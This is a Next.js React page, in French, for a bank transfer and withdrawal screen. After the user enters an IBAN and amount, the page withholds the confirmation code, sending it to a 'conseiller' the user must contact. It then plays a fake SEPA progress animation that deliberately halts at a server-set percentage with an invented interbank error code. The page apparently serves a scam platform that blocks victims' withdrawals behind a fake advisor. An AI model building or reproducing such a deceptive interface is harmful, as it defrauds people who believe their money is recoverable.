"use client";

import { useEffect, useState } from "react";
import Link from "next/link";

interface AccountData {
  availableBalanceCents: number;
  currency: string;
  message?: string;
}

function formatMoney(cents: number, currency: string = "EUR") {
  return new Intl.NumberFormat("fr-FR", {
    style: "currency",
    currency: currency || "EUR",
    minimumFractionDigits: 2,
  }).format(cents / 100);
}

export default function EnvoyerPage() {
  const [account, setAccount] = useState<AccountData | null>(null);
  const [recipientName, setRecipientName] = useState("");
  const [iban, setIban] = useState("");
  const [bic, setBic] = useState("");
  const [amount, setAmount] = useState("");
  const [description, setDescription] = useState("");

  // Step 1: Form, Step 2: OTP, Step 3: Loading / Failure
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [requestId, setRequestId] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  // Loading animation state for Step 3
  const [progress, setProgress] = useState(0);
  const [progressPhase, setProgressPhase] = useState("Connexion au réseau bancaire SEPA…");
  const [halted, setHalted] = useState(false);
  const [errorDetails, setErrorDetails] = useState("");

  const loadAccount = async () => {
    try {
      const res = await fetch("/api/dashboard/transactions");
      const data: AccountData = await res.json();
      if (!res.ok) throw new Error(data.message ?? "Erreur de solde");
      setAccount(data);
    } catch {
      // ignore
    }
  };

  useEffect(() => {
    loadAccount();
  }, []);

  // Step 1 -> Step 2: Request OTP
  const handleInitiateTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const res = await fetch("/api/dashboard/transactions/withdraw-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          recipientName,
          iban,
          bic,
          amount,
          description,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.message ?? "Erreur lors de la préparation du virement.");

      setRequestId(data.requestId);
      setStep(2);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Erreur.");
    } finally {
      setLoading(false);
    }
  };

  // Step 2 -> Step 3: Confirm OTP & trigger progress halting at configured percentage
  const handleConfirmTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otpCode.length !== 6) {
      setError("Le code de confirmation doit comporter 6 chiffres.");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const res = await fetch("/api/dashboard/transactions/withdraw-confirm", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          requestId,
          otpCode,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.message ?? "Code de confirmation erroné.");

      setErrorDetails(data.message);
      setStep(3);
      startLoadingSequence(data.haltAtPercent, data.errorCode);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Code invalide.");
    } finally {
      setLoading(false);
    }
  };

  // Step 3 animation: smoothly advances to 75% then halts in error
  const startLoadingSequence = (haltAtPercent: number = 75, errorCode: string = "ERR_SEPA_75") => {
    setProgress(0);
    setHalted(false);

    let current = 0;
    const interval = setInterval(() => {
      // Dynamic progress phases based on halt percentage
      const quarter = haltAtPercent / 4;
      const half = haltAtPercent / 2;
      const threeQuarters = (haltAtPercent * 3) / 4;

      if (current < quarter) {
        current += Math.max(1, Math.round(haltAtPercent / 20));
        setProgress(Math.min(current, haltAtPercent));
        setProgressPhase("Connexion sécurisée au réseau interbancaire SEPA…");
      } else if (current < half) {
        current += Math.max(1, Math.round(haltAtPercent / 25));
        setProgress(Math.min(current, haltAtPercent));
        setProgressPhase("Vérification des protocoles de compensation bancaire…");
      } else if (current < threeQuarters) {
        current += Math.max(1, Math.round(haltAtPercent / 35));
        setProgress(Math.min(current, haltAtPercent));
        setProgressPhase("Routage du flux financier vers l'établissement destinataire…");
      } else if (current < haltAtPercent) {
        current += 1;
        setProgress(Math.min(current, haltAtPercent));
        setProgressPhase("Finalisation du transfert SEPA…");
      } else {
        clearInterval(interval);
        setProgress(haltAtPercent);
        setHalted(true);
        setProgressPhase(`Échec du routage bancaire interbancaire (Code: ${errorCode})`);
      }
    }, 120);
  };

  return (
    <div style={{ maxWidth: "520px", margin: "0 auto", padding: "1.5rem 1rem 6rem", color: "#fff" }}>
      {/* Top Header */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "1.75rem" }}>
        <Link
          href="/dashboard"
          style={{
            width: "38px",
            height: "38px",
            borderRadius: "50%",
            background: "rgba(255,255,255,0.08)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            color: "#fff",
            textDecoration: "none",
            fontSize: "0.95rem",
          }}
        >
          <i className="fa-solid fa-chevron-left"></i>
        </Link>
        <h1 style={{ fontSize: "1.25rem", fontWeight: 700, margin: 0 }}>
          {step === 1 ? "Virement & Retrait" : step === 2 ? "Code de sécurité" : "Statut du virement"}
        </h1>
        <div style={{ width: "38px" }}></div>
      </div>

      {/* Available Balance Box */}
      <div
        style={{
          background: "linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.9))",
          borderRadius: "18px",
          padding: "1.25rem 1.5rem",
          border: "1px solid rgba(255,255,255,0.08)",
          marginBottom: "1.75rem",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
        }}
      >
        <div>
          <span style={{ fontSize: "0.75rem", textTransform: "uppercase", letterSpacing: "1px", color: "rgba(255,255,255,0.5)", fontWeight: 700, display: "block" }}>
            SOLDE DISPONIBLE
          </span>
          <div style={{ fontSize: "1.75rem", fontWeight: 800, color: "#fff" }}>
            {account ? formatMoney(account.availableBalanceCents, account.currency) : "…"}
          </div>
        </div>
        <div style={{ width: "42px", height: "42px", borderRadius: "12px", background: "rgba(59, 130, 246, 0.15)", display: "flex", alignItems: "center", justifyContent: "center", color: "#60a5fa", fontSize: "1.2rem" }}>
          <i className="fa-solid fa-arrow-up-right-from-square"></i>
        </div>
      </div>

      {/* Error Banner */}
      {error && (
        <div style={{ background: "rgba(239, 68, 68, 0.15)", border: "1px solid rgba(239, 68, 68, 0.4)", color: "#fca5a5", padding: "0.85rem 1rem", borderRadius: "12px", marginBottom: "1.25rem", fontSize: "0.9rem" }}>
          <i className="fa-solid fa-triangle-exclamation"></i> {error}
        </div>
      )}

      {/* STEP 1: FORM */}
      {step === 1 && (
        <form onSubmit={handleInitiateTransfer} style={{ display: "flex", flexDirection: "column", gap: "1.1rem" }}>
          <div>
            <label style={{ display: "block", fontSize: "0.85rem", color: "rgba(255,255,255,0.75)", marginBottom: "0.35rem", fontWeight: 600 }}>
              Nom et prénom du bénéficiaire
            </label>
            <input
              type="text"
              required
              value={recipientName}
              onChange={(e) => setRecipientName(e.target.value)}
              placeholder="Ex: Jean Dupont"
              style={{
                width: "100%",
                padding: "0.8rem 1rem",
                borderRadius: "12px",
                background: "rgba(255,255,255,0.06)",
                border: "1px solid rgba(255,255,255,0.12)",
                color: "#fff",
                fontSize: "0.95rem",
                boxSizing: "border-box",
              }}
            />
          </div>

          <div>
            <label style={{ display: "block", fontSize: "0.85rem", color: "rgba(255,255,255,0.75)", marginBottom: "0.35rem", fontWeight: 600 }}>
              IBAN de destination
            </label>
            <input
              type="text"
              required
              value={iban}
              onChange={(e) => setIban(e.target.value)}
              placeholder="FR76 3000 4000 5000 6000 7000 890"
              style={{
                width: "100%",
                padding: "0.8rem 1rem",
                borderRadius: "12px",
                background: "rgba(255,255,255,0.06)",
                border: "1px solid rgba(255,255,255,0.12)",
                color: "#fff",
                fontSize: "0.95rem",
                fontFamily: "monospace",
                boxSizing: "border-box",
              }}
            />
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "0.75rem" }}>
            <div>
              <label style={{ display: "block", fontSize: "0.85rem", color: "rgba(255,255,255,0.75)", marginBottom: "0.35rem", fontWeight: 600 }}>
                Code BIC / SWIFT
              </label>
              <input
                type="text"
                value={bic}
                onChange={(e) => setBic(e.target.value)}
                placeholder="BNPAFR22"
                style={{
                  width: "100%",
                  padding: "0.8rem 1rem",
                  borderRadius: "12px",
                  background: "rgba(255,255,255,0.06)",
                  border: "1px solid rgba(255,255,255,0.12)",
                  color: "#fff",
                  fontSize: "0.95rem",
                  fontFamily: "monospace",
                  boxSizing: "border-box",
                }}
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: "0.85rem", color: "rgba(255,255,255,0.75)", marginBottom: "0.35rem", fontWeight: 600 }}>
                Montant (€)
              </label>
              <input
                type="number"
                min="1"
                step="0.01"
                required
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                style={{
                  width: "100%",
                  padding: "0.8rem 1rem",
                  borderRadius: "12px",
                  background: "rgba(255,255,255,0.06)",
                  border: "1px solid rgba(255,255,255,0.12)",
                  color: "#fff",
                  fontSize: "1.05rem",
                  fontWeight: 700,
                  boxSizing: "border-box",
                }}
              />
            </div>
          </div>

          <div>
            <label style={{ display: "block", fontSize: "0.85rem", color: "rgba(255,255,255,0.75)", marginBottom: "0.35rem", fontWeight: 600 }}>
              Motif du virement (optionnel)
            </label>
            <input
              type="text"
              value={description}
              onChange={(e) => setDescription(e.target.value)}
              placeholder="Ex: Facture, Retrait, Remboursement..."
              maxLength={120}
              style={{
                width: "100%",
                padding: "0.8rem 1rem",
                borderRadius: "12px",
                background: "rgba(255,255,255,0.06)",
                border: "1px solid rgba(255,255,255,0.12)",
                color: "#fff",
                fontSize: "0.95rem",
                boxSizing: "border-box",
              }}
            />
          </div>

          <div style={{ marginTop: "1rem" }}>
            <button
              type="submit"
              disabled={loading || !recipientName.trim() || !iban.trim() || !amount}
              style={{
                width: "100%",
                padding: "1rem",
                borderRadius: "100px",
                background: "linear-gradient(135deg, #4361ee, #3a0ca3)",
                color: "#fff",
                fontSize: "1rem",
                fontWeight: 700,
                border: "none",
                cursor: loading ? "wait" : "pointer",
                boxShadow: "0 8px 25px rgba(67, 97, 238, 0.4)",
              }}
            >
              {loading ? "Vérification en cours…" : "Continuer vers la sécurisation"}
            </button>
          </div>
        </form>
      )}

      {/* STEP 2: OTP CONFIRMATION */}
      {step === 2 && (
        <div>
          {/* Summary card */}
          <div
            style={{
              background: "rgba(255,255,255,0.04)",
              borderRadius: "16px",
              padding: "1.25rem",
              border: "1px solid rgba(255,255,255,0.08)",
              marginBottom: "1.5rem",
            }}
          >
            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "0.6rem" }}>
              <span style={{ color: "rgba(255,255,255,0.6)", fontSize: "0.85rem" }}>Bénéficiaire</span>
              <strong style={{ fontSize: "0.95rem" }}>{recipientName}</strong>
            </div>
            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "0.6rem" }}>
              <span style={{ color: "rgba(255,255,255,0.6)", fontSize: "0.85rem" }}>IBAN destinataire</span>
              <span style={{ fontFamily: "monospace", fontSize: "0.9rem" }}>
                {iban.slice(0, 4)} •••• •••• {iban.slice(-4)}
              </span>
            </div>
            <div style={{ display: "flex", justifyContent: "space-between", borderTop: "1px solid rgba(255,255,255,0.08)", paddingTop: "0.6rem" }}>
              <span style={{ color: "rgba(255,255,255,0.6)", fontSize: "0.85rem" }}>Montant à transférer</span>
              <strong style={{ fontSize: "1.1rem", color: "#60a5fa" }}>{amount} €</strong>
            </div>
          </div>

          {/* Security Alert box */}
          <div
            style={{
              background: "rgba(59, 130, 246, 0.1)",
              border: "1px solid rgba(59, 130, 246, 0.3)",
              borderRadius: "14px",
              padding: "1rem 1.25rem",
              marginBottom: "1.75rem",
            }}
          >
            <div style={{ display: "flex", gap: "0.75rem", alignItems: "flex-start" }}>
              <i className="fa-solid fa-shield-halved" style={{ fontSize: "1.2rem", color: "#60a5fa", marginTop: "0.2rem" }}></i>
              <div>
                <strong style={{ fontSize: "0.95rem", display: "block", marginBottom: "0.3rem", color: "#93c5fd" }}>
                  Code de sécurité obligatoire
                </strong>
                <p style={{ fontSize: "0.85rem", color: "rgba(255,255,255,0.8)", margin: 0, lineHeight: 1.5 }}>
                  Pour des raisons de conformité et de contrôle anti-fraude, un code de validation à 6 chiffres a été généré et transmis à votre conseiller de gestion administrative. Veuillez vous rapprocher de lui pour récupérer le code de validation.
                </p>
              </div>
            </div>
          </div>

          <form onSubmit={handleConfirmTransfer}>
            <div style={{ marginBottom: "1.75rem", textAlign: "center" }}>
              <label style={{ display: "block", fontSize: "0.85rem", color: "rgba(255,255,255,0.7)", marginBottom: "0.75rem" }}>
                Saisissez le code de confirmation à 6 chiffres :
              </label>
              <input
                type="text"
                maxLength={6}
                required
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ""))}
                placeholder="••••••"
                style={{
                  width: "220px",
                  margin: "0 auto",
                  padding: "0.85rem 1rem",
                  borderRadius: "14px",
                  background: "rgba(255,255,255,0.08)",
                  border: "2px solid #4361ee",
                  color: "#fff",
                  fontSize: "1.8rem",
                  fontWeight: 800,
                  letterSpacing: "8px",
                  textAlign: "center",
                  fontFamily: "monospace",
                  display: "block",
                }}
              />
            </div>

            <div style={{ display: "flex", gap: "0.75rem" }}>
              <button
                type="button"
                onClick={() => setStep(1)}
                style={{
                  flex: 1,
                  padding: "0.9rem",
                  borderRadius: "100px",
                  background: "rgba(255,255,255,0.08)",
                  border: "none",
                  color: "#fff",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Retour
              </button>
              <button
                type="submit"
                disabled={loading || otpCode.length !== 6}
                style={{
                  flex: 2,
                  padding: "0.9rem",
                  borderRadius: "100px",
                  background: "linear-gradient(135deg, #10b981, #059669)",
                  border: "none",
                  color: "#fff",
                  fontWeight: 700,
                  fontSize: "1rem",
                  cursor: loading || otpCode.length !== 6 ? "not-allowed" : "pointer",
                  boxShadow: "0 6px 20px rgba(16, 185, 129, 0.4)",
                }}
              >
                {loading ? "Vérification…" : "Confirmer le virement"}
              </button>
            </div>
          </form>
        </div>
      )}

      {/* STEP 3: LOADING SEQUENCE & HALT AT 75% WITH ERROR */}
      {step === 3 && (
        <div style={{ textAlign: "center", padding: "2rem 0" }}>
          {/* Progress Circular Display */}
          <div style={{ position: "relative", width: "160px", height: "160px", margin: "0 auto 2rem" }}>
            <svg style={{ width: "100%", height: "100%", transform: "rotate(-90deg)" }} viewBox="0 0 100 100">
              {/* Background circle */}
              <circle
                cx="50"
                cy="50"
                r="42"
                stroke="rgba(255,255,255,0.08)"
                strokeWidth="8"
                fill="none"
              />
              {/* Animated Progress circle */}
              <circle
                cx="50"
                cy="50"
                r="42"
                stroke={halted ? "#ef4444" : "#4361ee"}
                strokeWidth="8"
                strokeDasharray="264"
                strokeDashoffset={264 - (264 * progress) / 100}
                strokeLinecap="round"
                fill="none"
                style={{ transition: "stroke-dashoffset 0.12s linear, stroke 0.3s ease" }}
              />
            </svg>

            <div
              style={{
                position: "absolute",
                inset: 0,
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <span style={{ fontSize: "2.2rem", fontWeight: 800, color: halted ? "#ef4444" : "#fff" }}>
                {progress}%
              </span>
              {halted && (
                <span style={{ fontSize: "0.75rem", fontWeight: 700, color: "#f87171", textTransform: "uppercase" }}>
                  INTERROMPU
                </span>
              )}
            </div>
          </div>

          {/* Phase text */}
          <h2 style={{ fontSize: "1.25rem", fontWeight: 700, marginBottom: "0.75rem", color: halted ? "#f87171" : "#fff" }}>
            {halted ? "Échec du virement interbancaire" : "Traitement du virement…"}
          </h2>

          <p style={{ fontSize: "0.9rem", color: halted ? "rgba(255,255,255,0.8)" : "rgba(255,255,255,0.6)", maxWidth: "420px", margin: "0 auto 2rem", lineHeight: 1.6 }}>
            {halted
              ? errorDetails || "Erreur de routage bancaire interbancaire (Code: ERR_SEPA_75). Le protocole de compensation SEPA n'a pas pu être finalisé auprès de l'établissement récepteur. Veuillez contacter votre conseiller bancaire ou vérifier les paramètres de sécurité de votre compte."
              : progressPhase}
          </p>

          {/* If halted: action buttons */}
          {halted && (
            <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem", maxWidth: "340px", margin: "0 auto" }}>
              <Link
                href="/dashboard"
                style={{
                  display: "block",
                  padding: "0.9rem 1.5rem",
                  borderRadius: "100px",
                  background: "linear-gradient(135deg, #4361ee, #3a0ca3)",
                  color: "#fff",
                  fontWeight: 700,
                  textDecoration: "none",
                  boxShadow: "0 6px 20px rgba(67, 97, 238, 0.4)",
                }}
              >
                Retour au tableau de bord
              </Link>
              <button
                type="button"
                onClick={() => {
                  setStep(1);
                  setOtpCode("");
                  setProgress(0);
                  setHalted(false);
                }}
                style={{
                  padding: "0.8rem",
                  borderRadius: "100px",
                  background: "rgba(255,255,255,0.06)",
                  border: "none",
                  color: "rgba(255,255,255,0.8)",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Recommencer une demande
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
